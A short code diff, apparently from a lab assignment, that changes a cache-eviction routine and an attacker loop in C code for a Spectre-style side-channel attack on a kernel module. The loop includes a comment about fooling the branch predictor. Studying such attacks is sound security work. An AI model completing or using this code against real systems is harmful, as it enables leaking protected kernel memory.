@@ -51,11 +51,20 @@ int max_idx(int *hist , int size) {
 }
 
 void flush_cache() {
-    int size = 50000;
+    int size = 3*1024;
     int all_cache[size];
     for (int i = 1 ; i < size ; i++)
     {
-        all_cache[i] = rand()%25 - all_cache[rand()%size];
+        all_cache[i] = rand()%25;
+    }
+    int it = 100 +  rand() % 20;
+    int tmp = 0;
+    for (int i = 0 ; i < it ; i++) {
+        for (int i = 1 ; i < size ; i++)
+        {
+            mfence();
+            all_cache[i] += all_cache[i];
+        }
     }
 }
 /*
@@ -81,8 +90,6 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             int min = 100000;
             for (size_t i = 0; i < 2048 ; i+=(rand()%3 + 1)) //fool BP -in part 2.4 we need to change max(i) //rand max i?
             { 
-                mfence();
-                flush_cache();
                 mfence();
                 call_kernel_part3(kernel_fd, shared_memory, rand() % 2);
             }
